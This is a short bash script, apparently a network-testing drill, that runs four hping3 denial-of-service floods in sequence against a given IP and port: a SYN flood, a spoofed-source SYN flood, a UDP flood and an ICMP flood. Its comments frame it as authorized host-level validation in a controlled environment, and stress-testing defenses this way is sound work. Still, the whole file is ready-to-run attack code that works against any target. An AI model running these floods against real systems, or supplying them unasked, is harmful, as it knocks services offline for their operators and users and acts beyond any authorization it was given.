#!/usr/bin/env bash
set -euo pipefail

# Minimal repeatable ParrotOS attack drills for host-level validation.
# Run from an attacker machine with authorization in a controlled environment.

if [[ $# -lt 2 ]]; then
  echo "Usage: $0 <target_ip> <target_port>"
  exit 1
fi

TARGET_IP="$1"
TARGET_PORT="$2"
DURATION="${DURATION:-30}"

echo "[1/4] SYN flood"
timeout "${DURATION}" hping3 -S -p "${TARGET_PORT}" --flood "${TARGET_IP}" || true
sleep 5

echo "[2/4] Spoofed SYN flood (--rand-source)"
timeout "${DURATION}" hping3 -S -p "${TARGET_PORT}" --flood --rand-source "${TARGET_IP}" || true
sleep 5

echo "[3/4] UDP flood"
timeout "${DURATION}" hping3 --udp -p "${TARGET_PORT}" --flood "${TARGET_IP}" || true
sleep 5

echo "[4/4] ICMP flood"
timeout "${DURATION}" hping3 --icmp --flood "${TARGET_IP}" || true

echo "Attack drill sequence complete."
